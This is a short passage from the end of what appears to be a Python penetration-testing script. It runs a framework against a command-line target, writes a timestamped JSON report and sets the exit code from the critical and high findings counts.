        sys.exit(1)
    
    target = sys.argv[1]
    
    # Run penetration test
    pen_test = PenetrationTestFramework(target)
    results = pen_test.run_comprehensive_test()
    
    # Save report
    report_file = f"penetration_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\nReport saved to: {report_file}")
    
    # Exit with appropriate code
    if results['summary']['critical'] > 0:
        sys.exit(1)
    elif results['summary']['high'] > 0:
        sys.exit(2)
    else:
        sys.exit(0)